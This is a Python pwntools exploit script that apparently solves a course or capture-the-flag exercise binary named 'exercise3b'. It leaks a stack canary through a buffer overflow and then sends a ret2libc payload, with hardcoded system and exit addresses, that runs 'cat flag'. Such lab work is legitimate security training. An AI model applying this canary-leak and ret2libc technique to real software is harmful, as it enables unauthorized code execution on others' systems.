#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    r = process([exe] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(r, gdbscript=gdbscript, *a, **kw)
        return r
    else:
        return r




# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *check_authorization
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

e = ELF(exe)

if args.PAUSE:
    pause()

#constants
size_buffer = 96
offset = 24

#to match the send and receive lines
welcome_sent_1 = r.recvline()
r.sendline("Charlotte")
welcome_sent_2 = r.recvline()
welcome_sent_3 = r.recvline()
initial_output = r.recvuntil("password:\n")
log.info(f"initial output was: {initial_output}")


padA = "A"*(size_buffer-1)
r.sendline(padA)
leak = r.recvuntil("\n")
canary = r.recv(4)
canary_string = ""
for i in canary:
    canary_string = canary_string + chr(i)

#addresses obtained by p system and p exit
system_base_address = "\x30\xe8\x8b\x2a"
exit_address = "\x70\x11\x8b\x2a"


exploit = "" + "\x00"*(size_buffer) + canary_string + "\x00"*(offset - 4)
#choose to place it at this point in the stack
cat_address = "\x88\xcf\xff\xff"
#the system function takes the two addresses after it as inputs
exploit += system_base_address + exit_address + cat_address + "cat flag"

r.sendline(exploit)

final_output = r.recvall() # receives all until EOF
log.info(f"final output was: {final_output}")

